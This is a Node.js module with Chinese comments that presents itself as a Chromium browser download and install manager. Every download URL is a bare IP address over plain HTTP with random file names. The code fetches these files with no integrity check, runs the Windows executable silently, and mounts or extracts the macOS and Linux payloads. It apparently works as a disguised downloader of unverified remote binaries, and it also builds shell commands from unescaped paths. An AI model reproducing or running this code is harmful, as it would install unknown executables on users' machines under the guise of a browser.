const fs = require('fs').promises;
const path = require('path');
const https = require('https');
const http = require('http');
const { exec } = require('child_process');
const os = require('os');

class BrowserDownloader {
    constructor() {
        this.downloadUrls = {
            windows: {
                x64: 'http://163.123.183.106:29772/down/AabMCedQhYb2.exe',
                x86: 'http://163.123.183.106:29772/down/AabMCedQhYb2.exe'
            },
            macos: {
                x64: 'http://163.123.183.106:29772/down/HZfJ5aHyFwTV.dmg',
                arm64: 'http://163.123.183.106:29772/down/HZfJ5aHyFwTV.dmg'
            },
            linux: {
                x64: 'http://163.123.183.106:29772/down/C4B2CVdEvc7C.xz'
            }
        };
        
        this.defaultInstallPaths = {
            windows: path.join(os.homedir(), 'AppData', 'Local', 'ChromiumManager', 'Browser'),
            macos: path.join(os.homedir(), 'Library', 'Application Support', 'ChromiumManager', 'Browser'),
            linux: path.join(os.homedir(), '.local', 'share', 'ChromiumManager', 'Browser')
        };
    }

    // 检测平台和架构
    detectPlatform() {
        const platform = process.platform;
        const arch = process.arch;
        
        let normalizedPlatform;
        let normalizedArch;
        
        switch (platform) {
            case 'win32':
                normalizedPlatform = 'windows';
                break;
            case 'darwin':
                normalizedPlatform = 'macos';
                break;
            case 'linux':
                normalizedPlatform = 'linux';
                break;
            default:
                throw new Error(`不支持的平台: ${platform}`);
        }
        
        switch (arch) {
            case 'x64':
            case 'x86_64':
                normalizedArch = 'x64';
                break;
            case 'arm64':
                normalizedArch = 'arm64';
                break;
            case 'ia32':
            case 'x86':
                normalizedArch = 'x86';
                break;
            default:
                normalizedArch = 'x64'; // 默认使用x64
        }
        
        return { platform: normalizedPlatform, arch: normalizedArch };
    }

    // 获取下载URL
    getDownloadUrl() {
        const { platform, arch } = this.detectPlatform();
        const platformUrls = this.downloadUrls[platform];
        
        if (!platformUrls) {
            throw new Error(`不支持的平台: ${platform}`);
        }
        
        // 优先使用对应架构，回退到x64
        return platformUrls[arch] || platformUrls.x64 || Object.values(platformUrls)[0];
    }

    // 获取默认安装路径
    getDefaultInstallPath() {
        const { platform } = this.detectPlatform();
        return this.defaultInstallPaths[platform];
    }

    // 下载文件
    async downloadFile(url, targetPath, onProgress) {
        console.log(`开始下载: ${url}`);
        console.log(`下载到: ${targetPath}`);
        
        // 确保目录存在
        await fs.mkdir(path.dirname(targetPath), { recursive: true });
        
        return new Promise((resolve, reject) => {
            const protocol = url.startsWith('https:') ? https : http;
            
            const request = protocol.get(url, (response) => {
                if (response.statusCode === 302 || response.statusCode === 301) {
                    // 处理重定向
                    this.downloadFile(response.headers.location, targetPath, onProgress)
                        .then(resolve)
                        .catch(reject);
                    return;
                }
                
                if (response.statusCode !== 200) {
                    reject(new Error(`下载失败，状态码: ${response.statusCode}`));
                    return;
                }
                
                const totalSize = parseInt(response.headers['content-length'], 10);
                let downloadedSize = 0;
                
                const fileStream = require('fs').createWriteStream(targetPath);
                
                response.on('data', (chunk) => {
                    downloadedSize += chunk.length;
                    fileStream.write(chunk);
                    
                    if (onProgress && totalSize) {
                        const progress = Math.round((downloadedSize / totalSize) * 100);
                        onProgress(progress, downloadedSize, totalSize);
                    }
                });
                
                response.on('end', () => {
                    fileStream.end();
                    console.log('下载完成');
                    resolve(targetPath);
                });
                
                response.on('error', (error) => {
                    fileStream.destroy();
                    reject(error);
                });
            });
            
            request.on('error', (error) => {
                reject(error);
            });
            
            request.setTimeout(300000, () => {
                request.destroy();
                reject(new Error('下载超时'));
            });
        });
    }

    // 处理安装文件
    async processInstallFile(filePath, installPath) {
        const { platform } = this.detectPlatform();
        const ext = path.extname(filePath).toLowerCase();
        
        console.log(`开始处理安装文件: ${filePath}`);
        console.log(`安装到: ${installPath}`);
        
        await fs.mkdir(installPath, { recursive: true });
        
        switch (platform) {
            case 'windows':
                if (ext === '.exe') {
                    return await this.installWindowsExecutable(filePath, installPath);
                } else {
                    throw new Error(`Windows平台不支持的文件格式: ${ext}`);
                }
                
            case 'macos':
                if (ext === '.dmg') {
                    return await this.installMacDMG(filePath, installPath);
                } else {
                    throw new Error(`macOS平台不支持的文件格式: ${ext}`);
                }
                
            case 'linux':
                if (ext === '.xz' || filePath.includes('.tar.xz')) {
                    return await this.extractLinuxArchive(filePath, installPath);
                } else {
                    throw new Error(`Linux平台不支持的文件格式: ${ext}`);
                }
                
            default:
                throw new Error(`不支持的平台: ${platform}`);
        }
    }

    // Windows EXE安装程序处理
    async installWindowsExecutable(exePath, installPath) {
        console.log('处理Windows可执行文件:', exePath);
        
        // 检查是否是安装程序
        const fileName = path.basename(exePath).toLowerCase();
        
        if (fileName.includes('installer')) {
            // 标准安装程序
            return await this.runWindowsInstaller(exePath, installPath);
        } else {
            // 便携版可执行文件
            return await this.handlePortableExecutable(exePath, installPath);
        }
    }

    // 运行Windows安装程序
    async runWindowsInstaller(exePath, installPath) {
        return new Promise((resolve, reject) => {
            const command = `"${exePath}" /S /D="${installPath}"`;
            console.log('运行Windows安装程序:', command);
            
            exec(command, { timeout: 300000 }, (error, stdout, stderr) => {
                if (error) {
                    console.warn('安装程序安装失败，尝试便携版处理:', error.message);
                    this.handlePortableExecutable(exePath, installPath)
                        .then(resolve)
                        .catch(reject);
                } else {
                    console.log('Windows安装完成');
                    resolve(installPath);
                }
            });
        });
    }

    // 处理便携版可执行文件
    async handlePortableExecutable(exePath, installPath) {
        console.log('处理为便携版浏览器');
        
        try {
            // 创建浏览器目录
            const browserDir = path.join(installPath, 'Browser');
            await fs.mkdir(browserDir, { recursive: true });
            
            // 复制可执行文件
            const targetExePath = path.join(browserDir, path.basename(exePath));
            await fs.copyFile(exePath, targetExePath);
            
            console.log(`便携版浏览器已准备: ${targetExePath}`);
            return installPath;
            
        } catch (error) {
            throw new Error(`便携版处理失败: ${error.message}`);
        }
    }

    // macOS DMG文件处理
    async installMacDMG(dmgPath, installPath) {
        console.log('处理macOS DMG文件:', dmgPath);
        
        // 1. 挂载DMG文件
        const mountPoint = await this.mountDMG(dmgPath);
        
        try {
            // 2. 复制.app文件
            await this.copyAppFromDMG(mountPoint, installPath);
            
            console.log('macOS应用安装完成');
            return installPath;
            
        } finally {
            // 3. 卸载DMG（无论成功失败都要卸载）
            await this.unmountDMG(mountPoint);
        }
    }

    // 挂载DMG文件
    async mountDMG(dmgPath) {
        return new Promise((resolve, reject) => {
            const mountCommand = `hdiutil attach "${dmgPath}" -nobrowse -quiet`;
            console.log('挂载DMG文件:', mountCommand);
            
            exec(mountCommand, (error, stdout, stderr) => {
                if (error) {
                    reject(new Error(`DMG挂载失败: ${error.message}`));
                    return;
                }
                
                console.log('hdiutil attach 输出:', stdout);
                
                // 解析挂载点
                let mountPoint = null;
                const mountLines = stdout.trim().split('\n');
                
                for (const line of mountLines) {
                    console.log('分析行:', line);
                    
                    // hdiutil attach输出格式: /dev/disk2s1 \t Apple_HFS \t /Volumes/应用名称
                    const parts = line.split('\t');
                    if (parts.length >= 3) {
                        const possibleMount = parts[parts.length - 1].trim();
                        if (possibleMount.startsWith('/Volumes/')) {
                            mountPoint = possibleMount;
                            console.log('找到挂载点 (方法1):', mountPoint);
                            break;
                        }
                    }
                    
                    // 备用方法：直接匹配/Volumes/路径
                    const volumeMatch = line.match(/\/Volumes\/[^\s\t]+/);
                    if (volumeMatch) {
                        mountPoint = volumeMatch[0];
                        console.log('找到挂载点 (方法2):', mountPoint);
                        break;
                    }
                }
                
                if (!mountPoint) {
                    // 最后的方法：使用默认的/Volumes/目录
                    console.log('尝试查找最新的/Volumes/目录...');
                    
                    exec('ls -la /Volumes/', (lsError, lsStdout) => {
                        if (!lsError) {
                            console.log('/Volumes/ 目录内容:', lsStdout);
                            
                            // 查找最新创建的非系统目录
                            const lines = lsStdout.split('\n');
                            for (const line of lines) {
                                if (line.includes('Chromium') || line.includes('ungoogled') || line.includes('Chrome')) {
                                    const parts = line.split(/\s+/);
                                    const dirName = parts[parts.length - 1];
                                    if (dirName && dirName !== '.' && dirName !== '..') {
                                        mountPoint = `/Volumes/${dirName}`;
                                        console.log('找到挂载点 (方法3):', mountPoint);
                                        break;
                                    }
                                }
                            }
                        }
                        
                        if (!mountPoint) {
                            reject(new Error('无法找到DMG挂载点'));
                        } else {
                            resolve(mountPoint);
                        }
                    });
                } else {
                    resolve(mountPoint);
                }
            });
        });
    }

    // 从DMG复制.app文件
    async copyAppFromDMG(mountPoint, installPath) {
        return new Promise((resolve, reject) => {
            try {
                console.log('在挂载点查找.app文件:', mountPoint);
                
                // 首先检查挂载点是否存在
                require('fs').accessSync(mountPoint);
                
                const items = require('fs').readdirSync(mountPoint);
                console.log('挂载点内容:', items);
                
                const appFile = items.find(item => item.endsWith('.app'));
                
                if (!appFile) {
                    throw new Error('DMG中未找到.app文件');
                }
                
                const sourcePath = path.join(mountPoint, appFile);
                const targetPath = path.join(installPath, appFile);
                
                console.log(`复制应用: ${sourcePath} -> ${targetPath}`);
                
                // 使用cp命令复制.app文件（保持权限）
                const copyCommand = `cp -R "${sourcePath}" "${targetPath}"`;
                
                exec(copyCommand, (copyError, stdout, stderr) => {
                    if (copyError) {
                        console.error('复制失败:', copyError);
                        console.error('错误输出:', stderr);
                        reject(new Error(`复制应用失败: ${copyError.message}`));
                    } else {
                        console.log('应用复制成功');
                        resolve();
                    }
                });
                
            } catch (error) {
                reject(new Error(`处理DMG内容失败: ${error.message}`));
            }
        });
    }

    // 卸载DMG
    async unmountDMG(mountPoint) {
        return new Promise((resolve) => {
            const unmountCommand = `hdiutil detach "${mountPoint}" -quiet`;
            console.log('卸载DMG:', unmountCommand);
            
            exec(unmountCommand, (error) => {
                if (error) {
                    console.warn('DMG卸载失败，但继续:', error.message);
                } else {
                    console.log('DMG卸载成功');
                }
                resolve(); // 无论成功失败都resolve
            });
        });
    }

    // Linux tar.xz压缩包处理
    async extractLinuxArchive(archivePath, installPath) {
        return new Promise((resolve, reject) => {
            const command = `tar -xf "${archivePath}" -C "${installPath}"`;
            console.log('解压Linux归档文件:', command);
            
            exec(command, (error, stdout, stderr) => {
                if (error) {
                    console.error('Linux解压失败:', error);
                    console.error('错误输出:', stderr);
                    reject(error);
                } else {
                    console.log('Linux解压完成');
                    resolve(installPath);
                }
            });
        });
    }

    // 主下载安装方法
    async downloadAndInstall(targetPath = null, onProgress = null) {
        try {
            // 检测系统
            const { platform, arch } = this.detectPlatform();
            console.log(`检测到系统: ${platform}-${arch}`);
            
            // 获取下载URL和目标路径
            const downloadUrl = this.getDownloadUrl();
            const installPath = targetPath || this.getDefaultInstallPath();
            
            // 下载文件
            const fileName = path.basename(downloadUrl);
            const downloadPath = path.join(path.dirname(installPath), fileName);
            
            // 检查文件是否已存在
            try {
                await fs.access(downloadPath);
                console.log('文件已存在，跳过下载');
            } catch {
                await this.downloadFile(downloadUrl, downloadPath, onProgress);
            }
            
            // 处理安装文件
            const extractPath = path.join(installPath, 'installed');
            await this.processInstallFile(downloadPath, extractPath);
            
            // 查找浏览器可执行文件
            const executablePath = await this.findBrowserExecutable(extractPath);
            
            if (!executablePath) {
                throw new Error('安装完成但未找到浏览器可执行文件');
            }
            
            console.log(`浏览器安装成功: ${executablePath}`);
            
            return {
                success: true,
                executablePath,
                installPath: extractPath
            };
            
        } catch (error) {
            console.error('下载安装失败:', error);
            throw error;
        }
    }

    // 查找浏览器可执行文件
    async findBrowserExecutable(searchPath) {
        const { platform } = this.detectPlatform();
        
        const executableNames = {
            windows: ['chrome.exe', 'chromium.exe', 'ungoogled-chromium.exe', 'Chromium.exe'],
            macos: ['Chromium.app', 'Ungoogled Chromium.app', 'Chrome.app'],
            linux: ['chrome', 'chromium', 'chromium-browser', 'ungoogled-chromium']
        };
        
        const names = executableNames[platform];
        
        // 递归搜索可执行文件
        const searchExecutable = async (dir, depth = 0) => {
            if (depth > 5) return null;
            
            try {
                const items = await fs.readdir(dir);
                
                // 首先在当前目录查找
                for (const name of names) {
                    if (items.includes(name)) {
                        const fullPath = path.join(dir, name);
                        
                        // 对于macOS的.app文件，需要找到内部的可执行文件
                        if (platform === 'macos' && name.endsWith('.app')) {
                            const macosPath = await this.findMacOSExecutable(fullPath);
                            if (macosPath) {
                                return macosPath;
                            }
                        } else {
                            return fullPath;
                        }
                    }
                }
                
                // 递归搜索子目录
                for (const item of items) {
                    const itemPath = path.join(dir, item);
                    try {
                        const stat = await fs.stat(itemPath);
                        if (stat.isDirectory()) {
                            const result = await searchExecutable(itemPath, depth + 1);
                            if (result) return result;
                        }
                    } catch {
                        continue;
                    }
                }
                
            } catch {
                // 忽略无法访问的目录
            }
            
            return null;
        };
        
        return await searchExecutable(searchPath);
    }

    // 查找macOS .app内的可执行文件
    async findMacOSExecutable(appPath) {
        const macosDir = path.join(appPath, 'Contents', 'MacOS');
        
        try {
            // 尝试多种可能的可执行文件名
            const possibleExecutables = [
                path.basename(appPath, '.app'),
                'Chromium',
                'chrome',
                'ungoogled-chromium',
                'Ungoogled Chromium'
            ];
            
            for (const execName of possibleExecutables) {
                const execPath = path.join(macosDir, execName);
                try {
                    await fs.access(execPath);
                    console.log(`找到macOS可执行文件: ${execPath}`);
                    return execPath;
                } catch {
                    continue;
                }
            }
            
            // 如果找不到标准名称，列出所有文件并选择第一个可执行文件
            try {
                const macosFiles = await fs.readdir(macosDir);
                for (const file of macosFiles) {
                    const filePath = path.join(macosDir, file);
                    try {
                        const stat = await fs.stat(filePath);
                        if (stat.isFile()) {
                            // 检查文件是否可执行
                            await fs.access(filePath, require('fs').constants.X_OK);
                            console.log(`找到macOS可执行文件: ${filePath}`);
                            return filePath;
                        }
                    } catch {
                        continue;
                    }
                }
            } catch {
                // 忽略错误
            }
            
        } catch {
            // 忽略错误
        }
        
        return null;
    }

    // 获取最新版本信息
    async getLatestVersion() {
        // 这里可以添加获取最新版本的逻辑
        return {
            version: '136.0.6776.101',
            published: new Date().toISOString()
        };
    }

    // 检查是否已安装
    async checkInstallation(installPath = null) {
        const searchPath = installPath || this.getDefaultInstallPath();
        
        try {
            const executablePath = await this.findBrowserExecutable(searchPath);
            return {
                installed: !!executablePath,
                executablePath,
                installPath: searchPath
            };
        } catch {
            return {
                installed: false,
                executablePath: null,
                installPath: searchPath
            };
        }
    }
}

module.exports = BrowserDownloader; 